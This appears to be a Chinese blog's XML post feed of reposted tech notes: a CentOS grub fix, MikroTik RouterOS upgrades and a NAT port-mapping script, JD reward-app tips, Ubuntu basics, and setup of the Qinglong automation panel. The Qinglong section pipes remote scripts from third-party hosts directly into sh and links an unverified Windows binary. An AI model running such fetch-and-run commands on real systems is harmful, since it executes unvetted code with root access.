class="line">       <span class="comment">//如需转化成yyyy/mm/dd</span></span><br><span class="line">       <span class="comment">// return year + &quot;/&quot; + month + &quot;/&quot; + date;</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;---&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>文章内容和代码来源于网络<a href="https://blog.csdn.net/wodecc_u/article/details/124666966">JavaScript&#x2F;JS关于时间函数的学习，并结合实际业务例子进入加强记忆，附快速获取当天、昨天等时间函数</a>，如有侵权请联系站长立即删除。</p>
]]></content>
      <categories>
        <category>coding</category>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>coding</tag>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>centos 更换内核，提示[错误] /boot/grub2/grub.cfg 找不到，请检查</title>
    <url>/posts/e4f82eb3/</url>
    <content><![CDATA[<p>提示&#x2F;boot&#x2F;grub&#x2F;grub.conf 找不到</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y grub</span><br><span class="line"></span><br><span class="line">grub-mkconfig -o /boot/grub/grub.conf</span><br></pre></td></tr></table></figure>

<p>提示&#x2F;boot&#x2F;grub2&#x2F;grub.cfg 找不到</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y grub2</span><br><span class="line"></span><br><span class="line">grub2-mkconfig -o /boot/grub2/grub.cfg</span><br></pre></td></tr></table></figure>

<p>文章内容和代码来源于 <a href="https://diannaobos.com/post/1014.html">Centos更换内核，提示[错误] &#x2F;boot&#x2F;grub2&#x2F;grub.cfg 找不到，请检查</a> ，如有侵权请联系站长立即删除。</p>
]]></content>
      <categories>
        <category>os</category>
        <category>centos</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>centos</tag>
      </tags>
  </entry>
  <entry>
    <title>mikrotik routeros/ros 系统下载/自动更新升级包/刷机固件</title>
    <url>/posts/1e44eff4/</url>
    <content><![CDATA[<h1 id="1-升级："><a href="#1-升级：" class="headerlink" title="1.升级："></a>1.升级：</h1><p>RouterOS升级的2种方式：</p>
<h2 id="1-1-在ROS中自动下载并升级："><a href="#1-1-在ROS中自动下载并升级：" class="headerlink" title="1.1.在ROS中自动下载并升级："></a>1.1.在ROS中自动下载并升级：</h2><p>打开Winbox，打开system-packages，然后点击左上角“Check For Updates”:</p>
<p>download-先下载好，等下次重启系统时升级系统<br>downlad&amp;install-现在下载并重启安装更新包</p>
<h2 id="1-2-下载离线包升级"><a href="#1-2-下载离线包升级" class="headerlink" title="1.2.下载离线包升级"></a>1.2.下载离线包升级</h2><p>*我应该怎么选择适合我的升级包<br>打开Winbox，标题栏括号中会显示你机器的类型，在下载页选择对应的包就行了<br>*离线更新包如何使用？<br>将下载的.npk文件，通过Winbox上传到files，重启系统即可升级。</p>
<p> <a href="https://mikrotik.com/download">MikroTik官方下载页面</a> </p>
<p>文章内容和代码来源于 <a href="https://www.roszj.com/mikrotik-routeros-updates">MikroTik Routeros&#x2F;ROS系统下载&#x2F;自动更新升级包&#x2F;刷机固件</a> ，如有侵权请联系站长立即删除。</p>
]]></content>
      <categories>
        <category>os</category>
        <category>ros</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>ros</tag>
      </tags>
  </entry>
  <entry>
    <title>京东羊毛汇总</title>
    <url>/posts/2b7d93c9/</url>
    <content><![CDATA[<h1 id="京东APP"><a href="#京东APP" class="headerlink" title="京东APP"></a>京东APP</h1><h2 id="1-京豆：入口-京东APP-我的-点击京豆即可查看京豆收支明细。或者给机器人发送【查询】"><a href="#1-京豆：入口-京东APP-我的-点击京豆即可查看京豆收支明细。或者给机器人发送【查询】" class="headerlink" title="1.京豆：入口:京东APP-我的-点击京豆即可查看京豆收支明细。或者给机器人发送【查询】"></a>1.京豆：入口:京东APP-我的-点击京豆即可查看京豆收支明细。或者给机器人发送【查询】</h2><h2 id="2-东东农场：入口-京东APP-我的-东东农场。【完成后只兑换不下单，可兑得无门槛红包-Level-4-的水果价值50元-。红包适用-于京东、京喜和京东极速版APP】"><a href="#2-东东农场：入口-京东APP-我的-东东农场。【完成后只兑换不下单，可兑得无门槛红包-Level-4-的水果价值50元-。红包适用-于京东、京喜和京东极速版APP】" class="headerlink" title="2.东东农场：入口:京东APP-我的-东东农场。【完成后只兑换不下单，可兑得无门槛红包(Level 4 的水果价值50元)。红包适用:于京东、京喜和京东极速版APP】"></a>2.东东农场：入口:京东APP-我的-东东农场。【完成后只兑换不下单，可兑得无门槛红包(Level 4 的水果价值50元)。红包适用:于京东、京喜和京东极速版APP】</h2><h2 id="3-东东萌宠：入口-京东APP-我的-东东萌宠。【完成后只兑换不下单，可兑得20元无门槛红包。红包适用-于京东APP】"><a href="#3-东东萌宠：入口-京东APP-我的-东东萌宠。【完成后只兑换不下单，可兑得20元无门槛红包。红包适用-于京东APP】" class="headerlink" title="3.东东萌宠：入口:京东APP-我的-东东萌宠。【完成后只兑换不下单，可兑得20元无门槛红包。红包适用:于京东APP】"></a>3.东东萌宠：入口:京东APP-我的-东东萌宠。【完成后只兑换不下单，可兑得20元无门槛红包。红包适用:于京东APP】</h2><h2 id="4-东东健康社区：入口-京东APP首页-直接搜索东东健康社区。【常有1元好物，比如口罩、维生素等等】"><a href="#4-东东健康社区：入口-京东APP首页-直接搜索东东健康社区。【常有1元好物，比如口罩、维生素等等】" class="headerlink" title="4.东东健康社区：入口:京东APP首页-直接搜索东东健康社区。【常有1元好物，比如口罩、维生素等等】"></a>4.东东健康社区：入口:京东APP首页-直接搜索东东健康社区。【常有1元好物，比如口罩、维生素等等】</h2><h2 id="5-京东APP-我的-优惠券：每天自动领取若干优惠券，以备不时之需。"><a href="#5-京东APP-我的-优惠券：每天自动领取若干优惠券，以备不时之需。" class="headerlink" title="5.京东APP-我的-优惠券：每天自动领取若干优惠券，以备不时之需。"></a>5.京东APP-我的-优惠券：每天自动领取若干优惠券，以备不时之需。</h2><h1 id="京东极速版APP"><a href="#京东极速版APP" class="headerlink" title="京东极速版APP"></a>京东极速版APP</h1><h2 id="1-京东极速版金币：入口-京东极速版APP-我的-金币-【建议累计金额达50元或100元兑换无门槛红包，仅红包适用-于京东极速版-APP】"><a href="#1-京东极速版金币：入口-京东极速版APP-我的-金币-【建议累计金额达50元或100元兑换无门槛红包，仅红包适用-于京东极速版-APP】" class="headerlink" title="1.京东极速版金币：入口:京东极速版APP-我的-金币 【建议累计金额达50元或100元兑换无门槛红包，仅红包适用:于京东极速版 APP】"></a>1.京东极速版金币：入口:京东极速版APP-我的-金币 【建议累计金额达50元或100元兑换无门槛红包，仅红包适用:于京东极速版 APP】</h2><h2 id="2-汪汪乐园：入口-京东极速版APP-我的-汪汪乐园-【汪汪乐园升级到30级可以兑换15元无门槛优惠券】"><a href="#2-汪汪乐园：入口-京东极速版APP-我的-汪汪乐园-【汪汪乐园升级到30级可以兑换15元无门槛优惠券】" class="headerlink" title="2.汪汪乐园：入口:京东极速版APP-我的-汪汪乐园 【汪汪乐园升级到30级可以兑换15元无门槛优惠券】"></a>2.汪汪乐园：入口:京东极速版APP-我的-汪汪乐园 【汪汪乐园升级到30级可以兑换15元无门槛优惠券】</h2><h1 id="京喜APP"><a href="#京喜APP" class="headerlink" title="京喜APP"></a>京喜APP</h1><h2 id="【⭐京喜红包：有效期为48小时，请及时使用】"><a href="#【⭐京喜红包：有效期为48小时，请及时使用】" class="headerlink" title="【⭐京喜红包：有效期为48小时，请及时使用】"></a>【⭐京喜红包：有效期为48小时，请及时使用】</h2><h2 id="1-京喜牧场：入口-京喜APP-我的-京喜牧场-【鸡蛋兑换好物红包】"><a href="#1-京喜牧场：入口-京喜APP-我的-京喜牧场-【鸡蛋兑换好物红包】" class="headerlink" title="1.京喜牧场：入口:京喜APP-我的-京喜牧场 【鸡蛋兑换好物红包】"></a>1.京喜牧场：入口:京喜APP-我的-京喜牧场 【鸡蛋兑换好物红包】</h2><h2 id="2-京喜工厂：入口-京喜APP-我的-京喜工厂-【产品生产完成后，须在有效期内完成兑换，逾期作废】"><a href="#2-京喜工厂：入口-京喜APP-我的-京喜工厂-【产品生产完成后，须在有效期内完成兑换，逾期作废】" class="headerlink" title="2.京喜工厂：入口:京喜APP-我的-京喜工厂 【产品生产完成后，须在有效期内完成兑换，逾期作废】"></a>2.京喜工厂：入口:京喜APP-我的-京喜工厂 【产品生产完成后，须在有效期内完成兑换，逾期作废】</h2><h2 id="3-京喜财富岛：入口-京喜APP-我的-京喜财富岛-【京喜财富岛可兑换现金（100）或其他礼品】"><a href="#3-京喜财富岛：入口-京喜APP-我的-京喜财富岛-【京喜财富岛可兑换现金（100）或其他礼品】" class="headerlink" title="3.京喜财富岛：入口:京喜APP-我的-京喜财富岛 【京喜财富岛可兑换现金（100）或其他礼品】"></a>3.京喜财富岛：入口:京喜APP-我的-京喜财富岛 【京喜财富岛可兑换现金（100）或其他礼品】</h2><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="京东赚赚：每月1号0点抢，仅红包适用-于京东APP"><a href="#京东赚赚：每月1号0点抢，仅红包适用-于京东APP" class="headerlink" title="京东赚赚：每月1号0点抢，仅红包适用:于京东APP"></a>京东赚赚：每月1号0点抢，仅红包适用:于京东APP</h2>]]></content>
      <categories>
        <category>tools</category>
        <category>qinglong</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>qinglong</tag>
        <tag>jd</tag>
      </tags>
  </entry>
  <entry>
    <title>routeros(ros) 端口映射转发回流</title>
    <url>/posts/3c41b99f/</url>
    <content><![CDATA[<h1 id="1-端口映射配置（有回流，建议采用）"><a href="#1-端口映射配置（有回流，建议采用）" class="headerlink" title="1.端口映射配置（有回流，建议采用）"></a>1.端口映射配置（有回流，建议采用）</h1><h2 id="1-1-点击“IP”-–-“Firewall”，选择“NAT”选项卡，并点击左上角蓝色“-”号，添加一条NAT记录。"><a href="#1-1-点击“IP”-–-“Firewall”，选择“NAT”选项卡，并点击左上角蓝色“-”号，添加一条NAT记录。" class="headerlink" title="1.1.点击“IP” – “Firewall”，选择“NAT”选项卡，并点击左上角蓝色“+”号，添加一条NAT记录。"></a>1.1.点击“IP” – “Firewall”，选择“NAT”选项卡，并点击左上角蓝色“+”号，添加一条NAT记录。</h2><h2 id="1-2-General选项卡根据下方内容进行配置"><a href="#1-2-General选项卡根据下方内容进行配置" class="headerlink" title="1.2.General选项卡根据下方内容进行配置"></a>1.2.General选项卡根据下方内容进行配置</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Chain：dstnat。</span><br><span class="line"></span><br><span class="line">Dst.Address：设为ADSL获取到的公网IP地址(随便写，使用脚本会自动更改)。</span><br><span class="line"></span><br><span class="line">Protocol：tcp（映射的协议类型）。</span><br><span class="line"></span><br><span class="line">Dst.Port：33899（外网端口号，可自定义设置）。</span><br></pre></td></tr></table></figure>

<h2 id="1-3-Action选项卡根据下方内容进行配置"><a href="#1-3-Action选项卡根据下方内容进行配置" class="headerlink" title="1.3.Action选项卡根据下方内容进行配置"></a>1.3.Action选项卡根据下方内容进行配置</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Action：dst-nat。</span><br><span class="line"></span><br><span class="line">To.Address：10.0.0.10(此处为内网设备的IP地址)。</span><br><span class="line"></span><br><span class="line">To Prots：3389（此处为内网设备提供服务的端口）。</span><br></pre></td></tr></table></figure>
<h2 id="1-4-点击“comment”，输入备注内容，例如（ESXI-WIN-33899-TO-3389），点击APPLEY和OK确认。"><a href="#1-4-点击“comment”，输入备注内容，例如（ESXI-WIN-33899-TO-3389），点击APPLEY和OK确认。" class="headerlink" title="1.4.点击“comment”，输入备注内容，例如（ESXI_WIN_33899_TO_3389），点击APPLEY和OK确认。"></a>1.4.点击“comment”，输入备注内容，例如（ESXI_WIN_33899_TO_3389），点击APPLEY和OK确认。</h2><p>comment内容不要使用中文，以方便记忆为准，后续脚本将使用comment名称来修改公网的动态IP。</p>
<h1 id="2-为端口转发创建一个回流脚本更新公网动态IP地址"><a href="#2-为端口转发创建一个回流脚本更新公网动态IP地址" class="headerlink" title="2.为端口转发创建一个回流脚本更新公网动态IP地址"></a>2.为端口转发创建一个回流脚本更新公网动态IP地址</h1><h2 id="2-1-点击“System”-–-“Scripts”，点击左上角蓝色“-”号，脚本名称随便填（例如：NAT-ESXI-WIN），将下方脚本内容粘贴至文本框中，点击APPLEY和OK确认。"><a href="#2-1-点击“System”-–-“Scripts”，点击左上角蓝色“-”号，脚本名称随便填（例如：NAT-ESXI-WIN），将下方脚本内容粘贴至文本框中，点击APPLEY和OK确认。" class="headerlink" title="2.1.点击“System” – “Scripts”，点击左上角蓝色“+”号，脚本名称随便填（例如：NAT_ESXI_WIN），将下方脚本内容粘贴至文本框中，点击APPLEY和OK确认。"></a>2.1.点击“System” – “Scripts”，点击左上角蓝色“+”号，脚本名称随便填（例如：NAT_ESXI_WIN），将下方脚本内容粘贴至文本框中，点击APPLEY和OK确认。</h2><p>回流脚本修改<br>interface&#x3D;pppoe-out1，修改为自己的PPPOE拨号名称。</p>
<p>comment&#x3D;”ESXI_WIN_33899_TO_3389”，修改为新建的NAT规则的comment名称。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:global ddnsinterface pppoe-out1</span><br><span class="line">:global ddnsip <span class="string">&quot;&quot;</span></span><br><span class="line">:<span class="built_in">set</span> ddnsip [/ip address get [find interface=<span class="variable">$ddnsinterface</span>] address]</span><br><span class="line">:<span class="built_in">set</span> ddnsip [:pick <span class="variable">$ddnsip</span> 0 [:find <span class="variable">$ddnsip</span> <span class="string">&quot;/&quot;</span>]]</span><br><span class="line">:<span class="keyword">if</span> ([/ip firewall nat get [find comment=<span class="string">&quot;3389&quot;</span>] dst-address] != <span class="variable">$ddnsip</span>) <span class="keyword">do</span>=&#123;</span><br><span class="line">/ip firewall nat <span class="built_in">set</span> [find comment=<span class="string">&quot;3389&quot;</span>] dst-address=<span class="variable">$ddnsip</span>&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-2-脚本添加完成后点击一次“RUN-SCRIPT”，就会将公网IP填入到刚刚创建好的NAT记录中，每次手动点击是不方便的，所以我们需要给脚本新增一个定时任务。"><a href="#2-2-脚本添加完成后点击一次“RUN-SCRIPT”，就会将公网IP填入到刚刚创建好的NAT记录中，每次手动点击是不方便的，所以我们需要给脚本新增一个定时任务。" class="headerlink" title="2.2.脚本添加完成后点击一次“RUN SCRIPT”，就会将公网IP填入到刚刚创建好的NAT记录中，每次手动点击是不方便的，所以我们需要给脚本新增一个定时任务。"></a>2.2.脚本添加完成后点击一次“RUN SCRIPT”，就会将公网IP填入到刚刚创建好的NAT记录中，每次手动点击是不方便的，所以我们需要给脚本新增一个定时任务。</h2><h1 id="3-为回流脚本添加定时任务"><a href="#3-为回流脚本添加定时任务" class="headerlink" title="3.为回流脚本添加定时任务"></a>3.为回流脚本添加定时任务</h1><h2 id="3-1-点击“System”-–-“Schedule”，点击左上角蓝色“-”号，"><a href="#3-1-点击“System”-–-“Schedule”，点击左上角蓝色“-”号，" class="headerlink" title="3.1.点击“System” – “Schedule”，点击左上角蓝色“+”号，"></a>3.1.点击“System” – “Schedule”，点击左上角蓝色“+”号，</h2><h2 id="3-2-Name：定时任务名称随便填（例如：NAT-ESXI-WIN-Schedule）"><a href="#3-2-Name：定时任务名称随便填（例如：NAT-ESXI-WIN-Schedule）" class="headerlink" title="3.2.Name：定时任务名称随便填（例如：NAT_ESXI_WIN_Schedule）"></a>3.2.Name：定时任务名称随便填（例如：NAT_ESXI_WIN_Schedule）</h2><h2 id="3-3-Start-Time：startup。"><a href="#3-3-Start-Time：startup。" class="headerlink" title="3.3.Start Time：startup。"></a>3.3.Start Time：startup。</h2><h2 id="3-4-Interval：00-01-00-代表一分钟执行一次-。"><a href="#3-4-Interval：00-01-00-代表一分钟执行一次-。" class="headerlink" title="3.4.Interval：00:01:00(代表一分钟执行一次)。"></a>3.4.Interval：00:01:00(代表一分钟执行一次)。</h2><h2 id="3-5-文本框内输入要执行的脚本名称，例如NAT-ESXI-WIN（这是创建回流脚本时定义的脚本名称Name），点击APPLEY和OK确认。"><a href="#3-5-文本框内输入要执行的脚本名称，例如NAT-ESXI-WIN（这是创建回流脚本时定义的脚本名称Name），点击APPLEY和OK确认。" class="headerlink" title="3.5.文本框内输入要执行的脚本名称，例如NAT_ESXI_WIN（这是创建回流脚本时定义的脚本名称Name），点击APPLEY和OK确认。"></a>3.5.文本框内输入要执行的脚本名称，例如NAT_ESXI_WIN（这是创建回流脚本时定义的脚本名称Name），点击APPLEY和OK确认。</h2><p>至此，ROS 端口映射配置完成</p>
<p>文章内容和代码来源于 <a href="https://blog.qiaohewei.cc/2020/08/24/routeros_port_mapping/#er_di_er_zhong_duan_kou_ying_she_pei_zhi_you_hui_liu_jian_yi_cai_yong">RouterOS(ROS)软路由端口映射转发回流</a> ， <a href="https://www.chiphell.com/thread-2324144-1-1.html">ROS如何简单设置回流？还有个自动填ip的脚本怎么搞？</a> ，如有侵权请联系站长立即删除。</p>
]]></content>
      <categories>
        <category>os</category>
        <category>ros</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>ros</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu 常用命令</title>
    <url>/posts/b208a70a/</url>
    <content><![CDATA[<p>ls 列出当前目录文件（不包括隐含文件）<br>ls -a 列出当前目录文件（包括隐含文件）<br>ls -l 列出当前目录下文件的详细信息</p>
<p>cd .. 回当前目录的上一级目录<br>cd - 回上一次所在的目录<br>cd ~ 或 cd 回当前用户的宿主目录<br>mkdir 目录名 创建一个目录<br>rmdir 空目录名 删除一个空目录<br>rm 文件名 文件名 删除一个文件或多个文件<br>rm -rf 非空目录名 删除一个非空目录下的一切</p>
<p>mv 路经&#x2F;文件 &#x2F;经&#x2F;文件移动相对路经下的文件到绝对路经下<br>mv 文件名 新名称 在当前目录下改名<br>find 路经 -name “字符串” 查找路经所在范围内满足字符串匹配的文件和目录</p>
<p>文章内容和代码来源于 <a href="https://blog.csdn.net/weixin_46246170/article/details/122865463">ubuntu 常用命令大全</a> ，如有侵权请联系站长立即删除。</p>
]]></content>
      <categories>
        <category>os</category>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>docker 搭建 qinglong 青龙面板</title>
    <url>/posts/b530596c/</url>
    <content><![CDATA[<p>项目地址：<a href="https://github.com/whyour/qinglong">https://github.com/whyour/qinglong</a></p>
<h1 id="1-docker部署"><a href="#1-docker部署" class="headerlink" title="1.docker部署"></a>1.docker部署</h1><h2 id="1-1创建docker-data和ql文件夹"><a href="#1-1创建docker-data和ql文件夹" class="headerlink" title="1.1创建docker_data和ql文件夹"></a>1.1创建docker_data和ql文件夹</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/data</span><br><span class="line"><span class="built_in">mkdir</span> docker_data</span><br><span class="line"><span class="built_in">mkdir</span> ql</span><br><span class="line"><span class="built_in">cd</span> /root/data/docker_data/ql</span><br></pre></td></tr></table></figure>

<h2 id="1-2-docker-安装"><a href="#1-2-docker-安装" class="headerlink" title="1.2.docker 安装"></a>1.2.docker 安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#更新包数据库</span></span><br><span class="line">sudo yum check-update</span><br><span class="line"><span class="comment">#下载安装docker</span></span><br><span class="line">curl -sSL https://get.daocloud.io/docker | sh</span><br><span class="line"><span class="comment">#启动</span></span><br><span class="line">sudo systemctl start docker</span><br><span class="line"><span class="comment">#状态</span></span><br><span class="line">sudo systemctl status docker</span><br><span class="line"><span class="comment">#开机启动</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> docker</span><br></pre></td></tr></table></figure>
<p>配置国内镜像源 Configure domestic mirror sources</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /etc/docker</span><br><span class="line"><span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;https://0b27f0a81a00f3560fbdc00ddd2f99e0.mirror.swr.myhuaweicloud.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://ypzju6vq.mirror.aliyuncs.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://registry.docker-cn.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;http://hub-mirror.c.163.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>
<h2 id="1-3-启动容器"><a href="#1-3-启动容器" class="headerlink" title="1.3.启动容器"></a>1.3.启动容器</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -dit \</span><br><span class="line">  -v <span class="variable">$PWD</span>/ql:/ql/data \</span><br><span class="line">  -p 5700:5700 \</span><br><span class="line">  --name qinglong \</span><br><span class="line">  --hostname qinglong \</span><br><span class="line">  --restart unless-stopped \</span><br><span class="line">  whyour/qinglong:latest</span><br></pre></td></tr></table></figure>

<h1 id="2-docker-compose-部署"><a href="#2-docker-compose-部署" class="headerlink" title="2.docker-compose 部署"></a>2.docker-compose 部署</h1><h2 id="2-1-创建docker-data和ql文件夹"><a href="#2-1-创建docker-data和ql文件夹" class="headerlink" title="2.1.创建docker_data和ql文件夹"></a>2.1.创建docker_data和ql文件夹</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="built_in">cd</span> /root/data</span><br><span class="line"><span class="built_in">mkdir</span> docker_data</span><br><span class="line"><span class="built_in">mkdir</span> ql</span><br><span class="line"><span class="built_in">cd</span> <span class="built_in">cd</span> /root/data/docker_data/ql</span><br></pre></td></tr></table></figure>

<h2 id="2-2-docker-compose-安装"><a href="#2-2-docker-compose-安装" class="headerlink" title="2.2.docker-compose 安装"></a>2.2.docker-compose 安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo curl -L <span class="string">&quot;https://github.com/docker/compose/releases/download/2.32.2/docker-compose-<span class="subst">$(uname -s)</span>-<span class="subst">$(uname -m)</span>&quot;</span> -o /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>

<h2 id="2-3-安装后进入ql文件夹内创建docker-compose-yml"><a href="#2-3-安装后进入ql文件夹内创建docker-compose-yml" class="headerlink" title="2.3.安装后进入ql文件夹内创建docker-compose.yml"></a>2.3.安装后进入ql文件夹内创建docker-compose.yml</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">version: <span class="string">&quot;3&quot;</span></span><br><span class="line">services:</span><br><span class="line">  qinglong:</span><br><span class="line">    image: whyour/qinglong:latest</span><br><span class="line">    container_name: qinglong</span><br><span class="line">    restart: unless-stopped</span><br><span class="line">    <span class="built_in">tty</span>: <span class="literal">true</span></span><br><span class="line">    ports:</span><br><span class="line">      - 5700:5700</span><br><span class="line">      - 5701:5701</span><br><span class="line">    environment:</span><br><span class="line">      - ENABLE_HANGUP=<span class="literal">true</span></span><br><span class="line">      - ENABLE_WEB_PANEL=<span class="literal">true</span></span><br><span class="line">    volumes:</span><br><span class="line">      - ./config:/ql/config</span><br><span class="line">      - ./log:/ql/log</span><br><span class="line">      - ./db:/ql/db</span><br><span class="line">      - ./repo:/ql/repo</span><br><span class="line">      - ./raw:/ql/raw</span><br><span class="line">      - ./scripts:/ql/scripts</span><br><span class="line">      - ./jbot:/ql/jbot</span><br><span class="line">      - ./ninja:/ql/ninja</span><br><span class="line">    labels:</span><br><span class="line">      - com.centurylinklabs.watchtower.enable=<span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h2 id="2-4-或者在ql文件夹下载docker-compose-yml"><a href="#2-4-或者在ql文件夹下载docker-compose-yml" class="headerlink" title="2.4.或者在ql文件夹下载docker-compose.yml"></a>2.4.或者在ql文件夹下载docker-compose.yml</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/whyour/qinglong/master/docker/docker-compose.yml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动</span></span><br><span class="line">docker-compose up -d</span><br><span class="line"><span class="comment"># 停止</span></span><br><span class="line">docker-compose down</span><br></pre></td></tr></table></figure>

<h1 id="3-青龙必须要安装的依赖"><a href="#3-青龙必须要安装的依赖" class="headerlink" title="3.青龙必须要安装的依赖"></a>3.青龙必须要安装的依赖</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">一键依赖</span><br><span class="line">docker <span class="built_in">exec</span> -it qinglong bash</span><br><span class="line">安装青龙依赖</span><br><span class="line">curl -fsSL https://ghproxy.com/https://raw.githubusercontent.com/FlechazoPh/QLDependency/main/Shell/QLOneKeyDependency.sh | sh</span><br></pre></td></tr></table></figure>
<h1 id="青龙全方面依赖，一键安装-免代码安装"><a href="#青龙全方面依赖，一键安装-免代码安装" class="headerlink" title="青龙全方面依赖，一键安装&#x2F;免代码安装"></a>青龙全方面依赖，一键安装&#x2F;免代码安装</h1><p>1.一般出现这种错误：(缺依赖)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error: Cannot find module ‘xx’</span><br></pre></td></tr></table></figure>
<p>操作是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it qinglong(名称) pnpm install xx（安装依赖）</span><br></pre></td></tr></table></figure>
<p>一般出现这种错误：(缺文件)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error: Cannot find module ‘./xx’</span><br></pre></td></tr></table></figure>
<p>那就很有是拉库命令不完整，请检查或复制完整的拉库命令</p>
<p>新增面板免代码 添加依赖命令<br>青龙面板安装好后，有些脚本总是提示找不到依赖，ssh或者群晖终端安装对于新手朋友来说不是很友好，其实青龙面板的依赖管理里面可以直接安装依赖，只需要输入依赖的名称就行。</p>
<h1 id="青龙脚本最全依赖"><a href="#青龙脚本最全依赖" class="headerlink" title="青龙脚本最全依赖"></a>青龙脚本最全依赖</h1><p>点击青龙面板的依赖管理——&gt;新建依赖——&gt;选择NodeJs、自动拆分选择是、复制以下的依赖填到名称里——&gt;点击确定，等待安装完成。</p>
<h2 id="NodeJs-依赖"><a href="#NodeJs-依赖" class="headerlink" title="NodeJs 依赖"></a>NodeJs 依赖</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">json5</span><br><span class="line">js-base64</span><br><span class="line">require</span><br><span class="line">tough-cookie</span><br><span class="line">jsdom</span><br><span class="line">global-agent</span><br><span class="line">@types/node</span><br><span class="line">typescript</span><br><span class="line">dotenv</span><br><span class="line">jsdom -g</span><br><span class="line">form-data</span><br><span class="line">png-js</span><br><span class="line">ts-md5</span><br><span class="line">tslib</span><br><span class="line">jieba</span><br><span class="line">ws@7.4.3</span><br><span class="line">axios</span><br><span class="line">date-fns</span><br><span class="line">moment</span><br><span class="line">prettytable</span><br><span class="line">fs</span><br><span class="line">depend</span><br><span class="line">ds</span><br><span class="line">jsdom</span><br><span class="line">requests</span><br><span class="line">npm</span><br><span class="line">node-jsencrypt</span><br><span class="line">-g npm</span><br><span class="line">cjs</span><br><span class="line">upgrade pip</span><br><span class="line">common</span><br><span class="line">qs</span><br><span class="line">ql</span><br><span class="line">node-telegram-bot-api</span><br><span class="line">crypto -g</span><br><span class="line">-g typescipt</span><br><span class="line">https</span><br><span class="line">proxy</span><br><span class="line">agent</span><br><span class="line">crypto-js</span><br><span class="line">request</span><br><span class="line">MD5@1.3.0 </span><br><span class="line">md5@2.x </span><br><span class="line">canvas </span><br><span class="line">（这个装不上就要换青龙版本2.12.2我测式了N次才得知）</span><br></pre></td></tr></table></figure>
<h2 id="python3-依赖"><a href="#python3-依赖" class="headerlink" title="python3 依赖"></a>python3 依赖</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pycryptodome</span><br><span class="line">pytz</span><br><span class="line">typescript</span><br><span class="line">httpx</span><br><span class="line">success</span><br><span class="line">--upgrade pip</span><br><span class="line">pip</span><br><span class="line">redis</span><br><span class="line">jieba</span><br><span class="line">canvas</span><br><span class="line">requests</span><br><span class="line">ping3</span><br><span class="line">PyExecJS</span><br></pre></td></tr></table></figure>
<h2 id="Linux依赖（安装失败的忽略）"><a href="#Linux依赖（安装失败的忽略）" class="headerlink" title="Linux依赖（安装失败的忽略）"></a>Linux依赖（安装失败的忽略）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc</span><br><span class="line">g++</span><br><span class="line">python3-dev</span><br><span class="line">libc-dev</span><br><span class="line">--no-cache</span><br><span class="line">build-base</span><br><span class="line">cairo-dev</span><br><span class="line">pango-dev</span><br><span class="line">giflib-dev</span><br></pre></td></tr></table></figure>

<h1 id="4-青龙京东助手"><a href="#4-青龙京东助手" class="headerlink" title="4.青龙京东助手"></a>4.青龙京东助手</h1><h2 id="Windows版"><a href="#Windows版" class="headerlink" title="Windows版"></a>Windows版</h2><p>下载:<a href="https://wwsf.lanzn.com/i3Qgp27knhhc">https://wwsf.lanzn.com/i3Qgp27knhhc</a> 密码:7qqq</p>
